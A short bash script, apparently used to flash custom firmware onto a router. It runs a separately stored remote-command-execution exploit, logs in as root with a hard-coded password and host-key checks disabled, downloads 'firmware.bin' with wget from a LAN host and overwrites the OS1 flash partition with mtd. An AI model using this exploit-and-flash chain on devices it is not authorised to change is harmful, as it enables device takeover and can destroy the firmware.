#!/usr/bin/env bash
python3 ./remote_command_execution_vulnerability.py

echo "SLEEPING FOR 7s"
sleep 7

sshpass -p root ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no root@192.168.31.1 "cd /tmp && wget http://192.168.31.254:8080/firmware.bin -O firmware.bin"
sshpass -p root ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no root@192.168.31.1 "cd /tmp && /sbin/mtd -e OS1 -r write firmware.bin OS1"
